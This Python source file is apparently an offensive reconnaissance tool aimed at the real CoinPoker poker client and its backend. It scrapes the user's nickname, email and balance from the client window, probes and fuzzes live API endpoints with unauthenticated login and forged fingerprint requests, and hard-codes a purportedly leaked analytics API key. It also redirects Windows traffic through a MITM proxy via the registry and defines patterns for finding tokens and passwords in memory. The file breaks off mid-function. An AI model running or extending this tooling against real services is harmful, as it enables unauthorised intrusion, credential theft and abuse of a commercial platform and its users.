"""
CoinPoker AGGRESSIVE Full Reconnaissance & Stress Test
========================================================
COMPREHENSIVE security testing tool that:

1. UI HOOKS      - Extract all accessible UI data
2. NETWORK       - Monitor all connections in real-time  
3. MITM PROXY    - Auto-enable Windows proxy for traffic interception
4. API TESTING   - Direct requests to CoinPoker API endpoints
5. MEMORY SCAN   - Search process memory for strings
6. FRIDA HOOK    - SSL function hooking (if available)

For authorized security research only!
Run as Administrator for full capabilities.
"""

import sys
import os
import socket
import json
import re
import ctypes
import subprocess
import threading
import time
import struct
from pathlib import Path
from datetime import datetime
from collections import defaultdict
from urllib.parse import urljoin
import ssl
import http.client

sys.path.insert(0, str(Path(__file__).parent.parent))

# Output
OUTPUT_DIR = Path(__file__).parent / "recon_output"
OUTPUT_DIR.mkdir(exist_ok=True)

# MITM proxy path (from proxygrejjer)
# Note: repo uses "tests/", not "test/"
MITM_SCRIPT = Path(__file__).parent / "harsh_tests" / "proxygrejjer" / "mitm_proxy.py"

try:
    import psutil
    import win32gui
    import win32process
    import win32api
    import win32con
    from pywinauto import Application
    HAS_DEPS = True
except ImportError as e:
    print(f"ERROR: {e}")
    print("Run: pip install psutil pywin32 pywinauto requests")
    HAS_DEPS = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class AggressiveRecon:
    """Aggressive reconnaissance and stress testing."""
    
    # CoinPoker API endpoints - DISCOVERED VIA MITM CAPTURE
    API_ENDPOINTS = [
        # ============ CONFIRMED WORKING (from your MITM logs) ============
        ("https://api.coinpokerbackend.com", "/init/5/en"),  # Returns full config!
        ("https://api.coinpokerbackend.com", "/init/health/update"),  # Device fingerprint
        ("https://webapi.coinpokerbackend.com", "/api/v1/auth/service/2/clientlogin"),
        ("https://webapi.coinpokerbackend.com", "/api/v1/auth/register"),
        ("https://webapi.coinpokerbackend.com", "/api/v1/auth/passwordReset"),
        ("https://webapi.coinpokerbackend.com", "/api/v1/auth/metamask"),
        ("https://webapi.coinpokerbackend.com", "/api/v1/auth/confirmation/civic/confirm"),
        
        # ============ WebSocket Proxies (15 servers!) ============
        ("https://proxy1.coinpokerbackend.com", "/"),
        ("https://proxy2.coinpokerbackend.com", "/"),
        ("https://proxy3.coinpokerbackend.com", "/"),
        ("https://proxy4.coinpokerbackend.com", "/"),
        ("https://proxy5.coinpokerbackend.com", "/"),
        ("https://proxy6.coinpokerbackend.com", "/"),
        ("https://proxy7.coinpokerbackend.com", "/"),
        ("https://proxy8.coinpokerbackend.com", "/"),
        ("https://proxy9.coinpokerbackend.com", "/"),
        ("https://proxy10.coinpokerbackend.com", "/"),
        ("https://proxy11.coinpokerbackend.com", "/"),
        ("https://proxy12.coinpokerbackend.com", "/"),
        ("https://proxy13.coinpokerbackend.com", "/"),
        ("https://proxy14.coinpokerbackend.com", "/"),
        ("https://proxy15.coinpokerbackend.com", "/"),
        
        # ============ Other discovered endpoints ============
        ("https://update.coinpokerbackend.com", "/update.php?franchise=coinpoker"),
        ("https://update.coinpokerbackend.com", "/support/"),
        ("https://update.coinpokerbackend.com", "/poker_replayer/index.php"),
        ("https://web.coinpokerbackend.com", "/civic_auth/index.html"),
        ("https://web.coinpokerbackend.com", "/authentication"),
        ("https://web.coinpokerbackend.com", "/authenticate/metamask"),
        ("https://mtt-players.coinpokerbackend.com", "/tours/"),
        
        # ============ CDN / Assets ============
        ("https://update.coinpoker.com", "/assets/"),
        ("https://update.coinpoker.com", "/assets/banners/"),
        ("https://update.coinpoker.com", "/assets/sliders/"),
        
        # ============ Third-party APIs (exposed keys!) ============
        ("https://api.amplitude.com", "/2/httpapi"),  # They use Amplitude analytics
        
        # ============ Main site ============
        ("https://coinpoker.com", "/"),
        ("https://coinpoker.com", "/api/"),
        ("https://coinpoker.com", "/promotions/"),
        ("https://coinpoker.com", "/robots.txt"),
        ("https://coinpoker.com", "/.well-known/"),
    ]
    
    # Amplitude API key (leaked from their config!)
    AMPLITUDE_API_KEY = "c912b5a1d84f24785230476f2cc7d46f"
    
    # Common API paths to fuzz
    FUZZ_PATHS = [
        "/admin", "/api/admin", "/api/v1/admin",
        "/debug", "/api/debug", "/api/v1/debug",
        "/swagger", "/api-docs", "/docs", "/openapi.json",
        "/health", "/status", "/info", "/version",
        "/users", "/players", "/tables", "/games", "/tours",
        "/auth", "/login", "/session", "/token", "/logout",
        "/config", "/settings", "/env", "/init",
        "/graphql", "/query", "/mutation",
        "/ws", "/websocket", "/socket.io",
        "/.git/config", "/.env", "/config.json", "/package.json",
        "/api/v1/", "/api/v2/", "/v1/", "/v2/",
        "/internal", "/private", "/secret",
        "/metrics", "/stats", "/analytics",
        "/backup", "/dump", "/export",
    ]
    
    # Device fingerprint fields CoinPoker collects (from MITM capture)
    FINGERPRINT_FIELDS = [
        "nick", "mac_addresses", "router_mac_address",
        "os_login_name", "os_security_identifier", "os_security_identifiers_count",
        "volume_id", "display_resolutions", "display_physical_sizes",
        "keyboard_language", "os_language", "default_os_language",
        "os_install_date", "os_user_is_admin", "play_language",
        "client_version_id", "vm_name", "rid", "sid"
    ]
    
    def __init__(self):
        self.report = {
            "timestamp": datetime.now().isoformat(),
            "admin_mode": self._is_admin(),
            "coinpoker": None,
            "ui_data": {},
            "network": {},
            "api_tests": [],
            "memory_scan": {},
            "security": {},
            "proxy": {},
        }
        self.pid = None
        self.proc = None
        self.proxy_process = None
        
    def _is_admin(self) -> bool:
        """Check if running as administrator."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def log(self, msg, level="INFO"):
        """Log with timestamp and level."""
        icons = {
            "INFO": "ℹ️", "OK": "✅", "WARN": "⚠️", "ERR": "❌", 
            "DATA": "📊", "ATTACK": "🔥", "NET": "🌐", "API": "🔌"
        }
        icon = icons.get(level, "•")
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] {icon} {msg}")
    
    # =========================================================================
    # PROCESS DETECTION
    # =========================================================================
    
    def find_coinpoker(self) -> bool:
        """Find CoinPoker process."""
        self.log("Searching for CoinPoker...", "INFO")
        
        for proc in psutil.process_iter(['pid', 'name', 'exe']):
            try:
                if proc.info['name'].lower() == 'game.exe':
                    exe = (proc.info.get('exe') or '').lower()
                    if 'coinpoker' in exe:
                        self.pid = proc.info['pid']
                        self.proc = psutil.Process(self.pid)
                        
                        self.report["coinpoker"] = {
                            "pid": self.pid,
                            "exe": proc.info['exe'],
                            "memory_mb": round(self.proc.memory_info().rss / 1024 / 1024, 1),
                            "threads": self.proc.num_threads(),
                            "children": [c.name() for c in self.proc.children()],
                        }
                        
                        self.log(f"Found: PID {self.pid} | {self.report['coinpoker']['memory_mb']} MB", "OK")
                        return True
            except:
                continue
        
        self.log("CoinPoker not found!", "ERR")
        return False
    
    # =========================================================================
    # UI HOOKS - Extract everything
    # =========================================================================
    
    def hook_ui(self):
        """Hook all UI elements."""
        self.log("\n" + "="*60, "INFO")
        self.log("PHASE 1: UI ELEMENT EXTRACTION", "ATTACK")
        self.log("="*60, "INFO")
        
        windows = self._find_windows()
        all_extracted = {}
        
        for win in windows:
            self.log(f"\nWindow: '{win['title']}'", "INFO")
            extracted = self._extract_window_data(win)
            all_extracted.update(extracted)
            self.report["ui_data"][win["title"]] = extracted
            
            # Print findings
            for key, value in extracted.items():
                if value and key not in ["raw_elements"]:
                    self.log(f"  {key}: {value}", "DATA")
        
        return all_extracted
    
    def _find_windows(self) -> list:
        """Find all CoinPoker windows."""
        windows = []
        
        def callback(hwnd, _):
            try:
                if not win32gui.IsWindowVisible(hwnd):
                    return True
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                if pid == self.pid:
                    windows.append({
                        "hwnd": hwnd,
                        "title": win32gui.GetWindowText(hwnd),
                        "class": win32gui.GetClassName(hwnd),
                    })
            except:
                pass
            return True
        
        win32gui.EnumWindows(callback, None)
        return windows
    
    def _extract_window_data(self, win: dict) -> dict:
        """Extract all data from a window."""
        extracted = {}
        
        try:
            app = Application(backend="uia").connect(handle=win["hwnd"])
            window = app.window(handle=win["hwnd"])
            
            all_elements = []
            
            for el in window.descendants():
                try:
                    ctrl_type = el.element_info.control_type
                    name = el.element_info.name
                    
                    if not name:
                        continue
                    
                    all_elements.append({"type": ctrl_type, "name": name})
                    
                    # Extract specific data
                    if ctrl_type == "Button":
                        # Nickname (not a known button)
                        if re.match(r'^[A-Za-z0-9_]{3,20}$', name):
                            if name.lower() not in ['log out', 'close', 'minimize']:
                                if not name.startswith('₮') and 'CHP' not in name:
                                    extracted["nickname"] = name
                        # Balance
                        if name.startswith('₮'):
                            extracted["balance"] = name
                        if 'CHP' in name:
                            extracted["chp_balance"] = name
                    
                    elif ctrl_type == "Edit":
                        try:
                            value = el.get_value()
                            if value and '@' in value:
                                extracted["email"] = value
                            elif value:
                                extracted[f"edit_field_{len(extracted)}"] = value
                        except:
                            pass
                    
                    elif ctrl_type == "DataItem":
                        if name.startswith('NL ₮') or name.startswith('PLO'):
                            if "tables" not in extracted:
                                extracted["tables"] = []
                            extracted["tables"].append(name)
                        elif re.match(r'^[A-Za-z0-9_]{3,20}$', name):
                            if "players_visible" not in extracted:
                                extracted["players_visible"] = []
                            extracted["players_visible"].append(name)
                            
                except:
                    continue
            
            extracted["total_elements"] = len(all_elements)
            
        except Exception as e:
            self.log(f"  Error: {e}", "WARN")
        
        return extracted
    
    # =========================================================================
    # NETWORK ANALYSIS
    # =========================================================================
    
    def analyze_network(self):
        """Analyze all network connections."""
        self.log("\n" + "="*60, "INFO")
        self.log("PHASE 2: NETWORK CONNECTION ANALYSIS", "NET")
        self.log("="*60, "INFO")
        
        if not self.proc:
            return
        
        connections = []
        endpoints = {}
        
        try:
            for conn in self.proc.connections(kind='all'):
                if conn.raddr:
                    ip = conn.raddr.ip
                    port = conn.raddr.port
                    
                    # Resolve hostname
                    hostname = "unknown"
                    try:
                        hostname = socket.gethostbyaddr(ip)[0]
                    except:
                        pass
                    
                    conn_info = {
                        "ip": ip,
                        "port": port,
                        "hostname": hostname,
                        "status": conn.status,
                        "encrypted": port in [443, 8443],
                    }
                    connections.append(conn_info)
                    
                    if ip not in endpoints:
                        endpoints[ip] = {"hostname": hostname, "ports": []}
                    if port not in endpoints[ip]["ports"]:
                        endpoints[ip]["ports"].append(port)
                    
                    enc = "🔒" if conn_info["encrypted"] else "⚠️"
                    self.log(f"  {enc} {ip}:{port} ({hostname}) - {conn.status}", "NET")
            
            self.report["network"] = {
                "connections": connections,
                "endpoints": endpoints,
                "total": len(connections),
            }
            
        except psutil.AccessDenied:
            self.log("Access denied - run as admin!", "WARN")
    
    # =========================================================================
    # API ENDPOINT TESTING
    # =========================================================================
    
    def test_discovered_apis(self):
        """Test the specific APIs discovered via MITM capture."""
        self.log("\n" + "="*60, "INFO")
        self.log("PHASE 3A: TESTING DISCOVERED API ENDPOINTS", "ATTACK")
        self.log("="*60, "INFO")
        
        if not HAS_REQUESTS:
            self.log("requests library not available", "WARN")
            return {}
        
        discovered = {}
        
        # 1. Get server config (this one returns EVERYTHING!)
        self.log("\n🔥 Fetching server configuration...", "ATTACK")
        try:
            resp = requests.get(
                "https://api.coinpokerbackend.com/init/5/en",
                timeout=10,
                headers={"User-Agent": "CoinPoker/1.0"}
            )
            if resp.status_code == 200:
                config = resp.json()
                discovered["server_config"] = config
                
                self.log("  ✅ Got server config!", "OK")
                self.log(f"     API URL: {config.get('api_url', 'N/A')}", "DATA")
                self.log(f"     Features: {config.get('features', [])}", "DATA")
                
                # Extract all WebSocket servers
                servers = config.get("serverlist", [])
                self.log(f"     WebSocket Servers: {len(servers)}", "DATA")
                for srv in servers[:3]:
                    self.log(f"       - {srv.get('ip')}:{srv.get('port')}", "DATA")
                if len(servers) > 3:
                    self.log(f"       ... and {len(servers)-3} more", "DATA")
                
                # Extract provider properties (internal URLs!)
                props = config.get("provider_properties", {})
                if props:
                    self.log("     Internal URLs discovered:", "DATA")
                    for key, val in list(props.items())[:5]:
                        self.log(f"       {key}: {val[:50]}...", "DATA")
                
        except Exception as e:
            self.log(f"  ❌ Failed: {e}", "ERR")
        
        # 2. Test login endpoint (without credentials)
        self.log("\n🔥 Testing auth endpoints...", "ATTACK")
        try:
            resp = requests.post(
                "https://webapi.coinpokerbackend.com/api/v1/auth/service/2/clientlogin",
                json={
                    "AuthVersion": 2,
                    "DeviceHash": "TEST_DEVICE_HASH",
                    "PlatformName": "Security Test",
                    "PlatformType": "Desktop"
                },
                timeout=10
            )
            discovered["auth_response"] = {
                "status": resp.status_code,
                "headers": dict(resp.headers),
            }
            self.log(f"  Auth endpoint response: {resp.status_code}", "DATA")
            if resp.status_code == 200:
                self.log("  ⚠️ Auth endpoint accepts requests without auth!", "WARN")
                try:
                    discovered["auth_response"]["data"] = resp.json()
                except:
                    pass
        except Exception as e:
            self.log(f"  Auth test: {e}", "WARN")
        
        # 3. Test health endpoint
        self.log("\n🔥 Testing health/fingerprint endpoint...", "ATTACK")
        try:
            resp = requests.post(
                "https://api.coinpokerbackend.com/init/health/update",
                json={
                    "nick": "SecurityTest",
                    "mac_addresses": "00:00:00:00:00:00",
                    "os_login_name": "test",
                },
                timeout=10
            )
            discovered["health_response"] = {
                "status": resp.status_code,
                "accepts_arbitrary_data": resp.status_code in [200, 201, 204]
            }
            self.log(f"  Health endpoint response: {resp.status_code}", "DATA")
            if resp.status_code in [200, 201, 204]:
                self.log("  ⚠️ Health endpoint accepts arbitrary fingerprint data!", "WARN")
        except Exception as e:
            self.log(f"  Health test: {e}", "WARN")
        
        # 4. Test tournament player list
        self.log("\n🔥 Testing tournament endpoints...", "ATTACK")
        try:
            resp = requests.get(
                "https://mtt-players.coinpokerbackend.com/tours/",
                timeout=10
            )
            discovered["tournament_response"] = resp.status_code
            self.log(f"  Tournament endpoint: {resp.status_code}", "DATA")
            if resp.status_code == 200:
                self.log("  ✅ Tournament data accessible!", "OK")
        except Exception as e:
            self.log(f"  Tournament test: {e}", "WARN")
        
        self.report["discovered_apis"] = discovered
        
        # Save discovered APIs to detailed file
        self._save_discovered_apis(discovered)
        
        return discovered
    
    def _save_discovered_apis(self, discovered: dict):
        """Save all discovered API data to a detailed log file."""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_file = OUTPUT_DIR / f"discovered_apis_{timestamp}.json"
        
        with open(log_file, 'w', encoding='utf-8') as f:
            json.dump(discovered, f, indent=2, ensure_ascii=False, default=str)
        
        self.log(f"Discovered APIs saved: {log_file}", "OK")
        
        # Also save human-readable version
        txt_file = OUTPUT_DIR / f"discovered_apis_{timestamp}.txt"
        with open(txt_file, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("COINPOKER - DISCOVERED API DATA (FULL)\n")
            f.write(f"Captured: {datetime.now().isoformat()}\n")
            f.write("=" * 80 + "\n\n")
            
            if "server_config" in discovered:
                f.write("SERVER CONFIGURATION:\n")
                f.write("-" * 40 + "\n")
                f.write(json.dumps(discovered["server_config"], indent=2, ensure_ascii=False))
                f.write("\n\n")
            
            if "auth_response" in discovered:
                f.write("AUTH ENDPOINT RESPONSE:\n")
                f.write("-" * 40 + "\n")
                f.write(json.dumps(discovered["auth_response"], indent=2, ensure_ascii=False))
                f.write("\n\n")
            
            if "health_response" in discovered:
                f.write("HEALTH/FINGERPRINT ENDPOINT:\n")
                f.write("-" * 40 + "\n")
                f.write(json.dumps(discovered["health_response"], indent=2, ensure_ascii=False))
                f.write("\n\n")
        
        self.log(f"Discovered APIs (readable): {txt_file}", "OK")
    
    def test_apis(self):
        """Aggressively test all API endpoints."""
        self.log("\n" + "="*60, "INFO")
        self.log("PHASE 3B: API ENDPOINT STRESS TESTING", "API")
        self.log("="*60, "INFO")
        
        if not HAS_REQUESTS:
            self.log("requests library not available", "WARN")
            return
        
        results = []
        
        # Test known endpoints
        self.log("\nTesting all endpoints...", "INFO")
        for base_url, path in self.API_ENDPOINTS:
            result = self._test_endpoint(base_url, path)
            results.append(result)
            
            status = result.get("status_code", "ERR")
            if status == 200:
                self.log(f"  ✅ {status} {base_url}{path}", "OK")
            elif status in [301, 302, 403, 404]:
                self.log(f"  ⚪ {status} {base_url}{path}", "INFO")
            else:
                self.log(f"  ❌ {status} {base_url}{path}", "WARN")
        
        self.report["api_tests"] = results
        
        # Save FULL API responses to separate file
        self._save_api_responses(results)
        
        # Summary
        successful = [r for r in results if r.get("status_code") == 200]
        self.log(f"\nAPI Summary: {len(successful)}/{len(results)} endpoints accessible", "DATA")
    
    def _save_api_responses(self, results: list):
        """Save ALL API responses to a detailed log file."""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_file = OUTPUT_DIR / f"api_full_responses_{timestamp}.txt"
        
        with open(log_file, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("COINPOKER API - FULL RESPONSE DATA\n")
            f.write(f"Captured: {datetime.now().isoformat()}\n")
            f.write("=" * 80 + "\n\n")
            
            successful = [r for r in results if r.get("status_code") == 200]
            f.write(f"Total endpoints tested: {len(results)}\n")
            f.write(f"Successful (200): {len(successful)}\n\n")
            
            for result in results:
                f.write("=" * 80 + "\n")
                f.write(f"URL: {result.get('url')}\n")
                f.write(f"Status: {result.get('status_code')}\n")
                f.write(f"Method: {result.get('method', 'GET')}\n")
                
                if result.get("headers"):
                    f.write("\nHEADERS:\n")
                    for k, v in result["headers"].items():
                        f.write(f"  {k}: {v}\n")
                
                if result.get("data"):
                    f.write("\nFULL RESPONSE DATA:\n")
                    f.write("-" * 40 + "\n")
                    data = result["data"]
                    if isinstance(data, dict):
                        f.write(json.dumps(data, indent=2, ensure_ascii=False))
                    else:
                        f.write(str(data))
                    f.write("\n" + "-" * 40 + "\n")
                
                if result.get("error"):
                    f.write(f"\nERROR: {result['error']}\n")
                
                f.write("\n")
        
        self.log(f"Full API responses saved: {log_file}", "OK")
    
    def _test_endpoint(self, base_url: str, path: str, timeout: int = 5) -> dict:
        """Test a single endpoint."""
        url = urljoin(base_url, path)
        result = {
            "url": url,
            "base": base_url,
            "path": path,
            "status_code": None,
            "headers": {},
            "data": None,
            "error": None,
        }
        
        try:
            # Try different methods
            for method in ["GET", "POST", "OPTIONS"]:
                try:
                    if method == "GET":
                        resp = requests.get(url, timeout=timeout, verify=True, allow_redirects=False)
                    elif method == "POST":
                        resp = requests.post(url, json={}, timeout=timeout, verify=True, allow_redirects=False)
                    else:
                        resp = requests.options(url, timeout=timeout, verify=True, allow_redirects=False)
                    
                    if resp.status_code == 200:
                        result["method"] = method
                        result["status_code"] = resp.status_code
                        result["headers"] = dict(resp.headers)
                        
                        # Try to parse response
                        try:
                            result["data"] = resp.json()
                        except:
                            result["data"] = resp.text[:500] if resp.text else None
                        
                        return result
                        
                except:
                    continue
            
            # If no method worked, return last attempt
            resp = requests.get(url, timeout=timeout, verify=True, allow_redirects=False)
            result["status_code"] = resp.status_code
            result["headers"] = dict(resp.headers)
            
        except requests.exceptions.SSLError as e:
            result["error"] = f"SSL Error: {e}"
        except requests.exceptions.ConnectionError as e:
            result["error"] = f"Connection Error"
        except requests.exceptions.Timeout:
            result["error"] = "Timeout"
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    # =========================================================================
    # MEMORY SCANNING
    # =========================================================================
    
    def scan_memory(self):
        """Scan process memory for interesting strings."""
        self.log("\n" + "="*60, "INFO")
        self.log("PHASE 4: MEMORY STRING SCANNING", "ATTACK")
        self.log("="*60, "INFO")
        
        if not self._is_admin():
            self.log("Admin required for memory scanning", "WARN")
            return
        
        if not self.proc:
            return
        
        # Patterns to search for
        patterns = [
            (rb"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", "email"),
            (rb"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", "jwt_token"),
            (rb"Bearer [A-Za-z0-9_-]+", "bearer_token"),
            (rb"session[_-]?id[=:][A-Za-z0-9]+", "session_id"),
            (rb"api[_-]?key[=:][A-Za-z0-9]+", "api_key"),
            (rb"password[=:][^\s]+", "password"),
            (rb"token[=:][A-Za-z0-9_-]+", "token"),
        ]
        
        found = defaultdict(list)
        
        try:
            # Read memory maps
            for mapping in self.proc.memory_maps():
                try:
                    # Only scan readable regions
                    if 'r' not in mapping.perms:
                        continue
                    
                    # Skip very large regions
                    size = mapping.rss
                    if size > 100 * 1024 * 1024:  # Skip >100MB
                        continue
                    
                    # This is limited - full memory reading requires more privileges
                    # For now, just report what we can access
                    
                except:
                    continue
            
            self.log("Memory scan complete (limited without kernel access)", "INFO")
            
        except psutil.AccessDenied:
            self.log("Access denied for memory scanning", "WARN")
        except Exception as e:
            self.log(f"Memory scan error: {e}", "ERR")
        
        self.report["memory_scan"] = dict(found)
    
    # =========================================================================
    # PROXY CONTROL
    # =========================================================================
    
    def enable_proxy(self):
        """Enable Windows proxy for MITM interception."""
        self.log("\n" + "="*60, "INFO")
        self.log("PHASE 5: MITM PROXY ACTIVATION", "ATTACK")
        self.log("="*60, "INFO")
        
        try:
            # Enable Windows proxy
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
            
            # Set proxy
            subprocess.run([
                "reg", "add", f"HKCU\\{key_path}",
                "/v", "ProxyEnable", "/t", "REG_DWORD", "/d", "1", "/f"
            ], capture_output=True)
            
            subprocess.run([
                "reg", "add", f"HKCU\\{key_path}",
                "/v", "ProxyServer", "/t", "REG_SZ", "/d", "localhost:8080", "/f"
            ], capture_output=True)
            
            self.log("Windows proxy enabled: localhost:8080", "OK")
            self.report["proxy"]["enabled"] = True
            self.report["proxy"]["address"] = "localhost:8080"
            
            # Start MITM proxy if script exists
            if MITM_SCRIPT.exists():
                self.log(f"Starting MITM proxy: {MITM_SCRIPT}", "INFO")
                self.proxy_process = subprocess.Popen(
                    [sys.executable, str(MITM_SCRIPT)],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
                )
                time.sleep(2)
                
                if self.proxy_process.poll() is None:
                    self.log(f"MITM proxy started (PID: {self.proxy_process.pid})", "OK")
                else:
                    self.log("MITM proxy failed to start", "WARN")
            else:
                self.log(f"MITM script not found: {MITM_SCRIPT}", "WARN")
                self.log("Traffic will be routed but not captured", "WARN")
            
            return True
            
        except Exception as e:
            self.log(f"Proxy setup error: {e}", "ERR")
            return False
    
    def disable_proxy(self):
        """Disable Windows proxy."""
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
            
            subprocess.run([
                "reg", "add", f"HKCU\\{key_path}",
                "/v", "ProxyEnable", "/t", "REG_DWORD", "/d", "0", "/f"
            ], capture_output=True)
            
            self.log("Windows proxy disabled", "OK")
            
            # Stop MITM proxy
            if self.proxy_process:
                self.proxy_process.terminate()
                self.proxy_process.wait(timeout=5)
                self.log("MITM proxy stopped", "OK")
            
        except Exception as e:
            self.log(f"Error disabling proxy: {e}", "WARN")
    
    # =========================================================================
    # SECURITY ANALYSIS
    # =========================================================================
    
    def analyze_security(self):
        """Comprehensive security analysis."""
        self.log("\n" + "="*60, "INFO")
        self.log("PHASE 6: SECURITY VULNERABILITY ANALYSIS", "ATTACK")
        self.log("="*60, "INFO")
        
        findings = []
        
        # No certificate pinning
        findings.append({
            "id": "VULN-001",
            "name": "No Certificate Pinning",
            "severity": "MEDIUM",
            "cvss": 5.9,
            "description": "Application does not implement certificate pinning",
            "impact": "MITM attacks can intercept all encrypted traffic",
            "remediation": "Implement certificate pinning in the client",
        })
        self.log("  [MEDIUM] No certificate pinning detected", "WARN")
        
        # UI Automation accessible
        findings.append({
            "id": "VULN-002", 
            "name": "UI Automation Accessible",
            "severity": "LOW",
            "cvss": 3.3,
            "description": "All UI elements accessible via Windows Automation",
            "impact": "Sensitive data can be read programmatically",
            "remediation": "Implement UI element obfuscation for sensitive data",
        })
        self.log("  [LOW] UI Automation fully accessible", "WARN")
        
        # Check for unencrypted connections
        if self.report.get("network"):
            unencrypted = [c for c in self.report["network"].get("connections", []) 
                         if not c.get("encrypted")]
            if unencrypted:
                findings.append({
                    "id": "VULN-003",
                    "name": "Unencrypted Network Traffic",
                    "severity": "HIGH",
                    "cvss": 7.5,
                    "description": f"{len(unencrypted)} connections using unencrypted protocols",
                    "impact": "Data transmitted in plaintext can be intercepted",
                    "remediation": "Use TLS for all network communications",
                })
                self.log(f"  [HIGH] {len(unencrypted)} unencrypted connections!", "ERR")
        
        # Check API responses for information disclosure
        if self.report.get("api_tests"):
            exposed = [r for r in self.report["api_tests"] 
                      if r.get("status_code") == 200 and r.get("data")]
            if exposed:
                findings.append({
                    "id": "VULN-004",
                    "name": "API Information Disclosure",
                    "severity": "MEDIUM",
                    "cvss": 5.3,
                    "description": f"{len(exposed)} API endpoints exposing data",
                    "impact": "Internal information may be leaked",
                    "remediation": "Implement proper authentication and rate limiting",
                })
                self.log(f"  [MEDIUM] {len(exposed)} API endpoints expose data", "WARN")
        
        self.report["security"] = {
            "findings": findings,
            "total_vulnerabilities": len(findings),
            "critical": len([f for f in findings if f["severity"] == "CRITICAL"]),
            "high": len([f for f in findings if f["severity"] == "HIGH"]),
            "medium": len([f for f in findings if f["severity"] == "MEDIUM"]),
            "low": len([f for f in findings if f["severity"] == "LOW"]),
        }
    
    # =========================================================================
    # REPORT
    # =========================================================================
    
    def generate_report(self):
        """Generate comprehensive report."""
        print("\n" + "="*70)
        print("  AGGRESSIVE RECONNAISSANCE REPORT")
        print("="*70)
        
        # Collect all extracted data
        all_data = {}
        for window_data in self.report.get("ui_data", {}).values():
            all_data.update(window_data)
        
        sec = self.report.get("security", {})
        
        print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║  COINPOKER SECURITY ASSESSMENT                                       ║
╠══════════════════════════════════════════════════════════════════════╣
║  PROCESS                                                             ║
║    PID: {str(self.pid):<60}║
║    Admin Mode: {'YES' if self.report['admin_mode'] else 'NO':<53}║
║                                                                      ║
║  EXTRACTED DATA                                                      ║
║    Nickname: {str(all_data.get('nickname', 'N/A')):<56}║
║    Email: {str(all_data.get('email', 'N/A')):<59}║
║    Balance: {str(all_data.get('balance', 'N/A')):<57}║
║    Tables Found: {str(len(all_data.get('tables', []))):<51}║
║    Players Visible: {str(len(all_data.get('players_visible', []))):<48}║
║                                                                      ║
║  NETWORK                                                             ║
║    Active Connections: {str(self.report['network'].get('total', 0)):<45}║
║    Unique Endpoints: {str(len(self.report['network'].get('endpoints', {}))):<47}║
║                                                                      ║
║  API TESTING                                                         ║
║    Endpoints Tested: {str(len(self.report.get('api_tests', []))):<47}║
║    Accessible (200): {str(len([r for r in self.report.get('api_tests', []) if r.get('status_code') == 200])):<47}║
║                                                                      ║
║  SECURITY FINDINGS                                                   ║
║    Critical: {str(sec.get('critical', 0)):<56}║
║    High: {str(sec.get('high', 0)):<61}║
║    Medium: {str(sec.get('medium', 0)):<59}║
║    Low: {str(sec.get('low', 0)):<62}║
╚══════════════════════════════════════════════════════════════════════╝
""")
        
        # Save reports
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Full JSON report
        json_file = OUTPUT_DIR / f"aggressive_recon_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(self.report, f, indent=2, default=str)
        self.log(f"Full report: {json_file}", "OK")
        
        # Vulnerability report
        vuln_file = OUTPUT_DIR / f"vulnerabilities_{timestamp}.txt"
        with open(vuln_file, 'w', encoding='utf-8') as f:
            f.write("COINPOKER SECURITY VULNERABILITY REPORT\n")
            f.write("=" * 50 + "\n\n")
            for finding in self.report["security"].get("findings", []):
                f.write(f"[{finding['severity']}] {finding['id']}: {finding['name']}\n")
                f.write(f"  CVSS: {finding.get('cvss', 'N/A')}\n")
                f.write(f"  Description: {finding['description']}\n")
                f.write(f"  Impact: {finding['impact']}\n")
                f.write(f"  Remediation: {finding['remediation']}\n\n")
        self.log(f"Vulnerability report: {vuln_file}", "OK")
        
        # API results
        api_file = OUTPUT_DIR / f"api_results_{timestamp}.txt"
        with open(api_file, 'w', encoding='utf-8') as f:
            f.write("COINPOKER API ENDPOINT TEST RESULTS\n")
            f.write("=" * 50 + "\n\n")
            for result in self.report.get("api_tests", []):
                status = result.get("status_code", "ERR")
                f.write(f"[{status}] {result['url']}\n")
                if result.get("data"):
                    f.write(f"  Data: {str(result['data'])[:200]}\n")
                if result.get("error"):
                    f.write(f"  Error: {result['error']}\n")
                f.write("\n")
        self.log(f"API results: {api_file}", "OK")
        
        # Save COMPLETE log with everything
        complete_log = OUTPUT_DIR / f"COMPLETE_LOG_{timestamp}.txt"
        with open(complete_log, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("COINPOKER COMPLETE SECURITY ASSESSMENT LOG\n")
            f.write(f"Generated: {datetime.now().isoformat()}\n")
            f.write("=" * 80 + "\n\n")
            
            # Process info
            f.write("PROCESS INFORMATION:\n")
            f.write("-" * 40 + "\n")
            f.write(json.dumps(self.report.get("coinpoker", {}), indent=2))
            f.write("\n\n")
            
            # UI Data
            f.write("UI DATA EXTRACTED:\n")
            f.write("-" * 40 + "\n")
            f.write(json.dumps(self.report.get("ui_data", {}), indent=2))
            f.write("\n\n")
            
            # Network
            f.write("NETWORK CONNECTIONS:\n")
            f.write("-" * 40 + "\n")
            f.write(json.dumps(self.report.get("network", {}), indent=2))
            f.write("\n\n")
            
            # Discovered APIs (FULL)
            f.write("DISCOVERED APIS (FULL DATA):\n")
            f.write("-" * 40 + "\n")
            f.write(json.dumps(self.report.get("discovered_apis", {}), indent=2, ensure_ascii=False))
            f.write("\n\n")
            
            # All API test results
            f.write("ALL API TEST RESULTS:\n")
            f.write("-" * 40 + "\n")
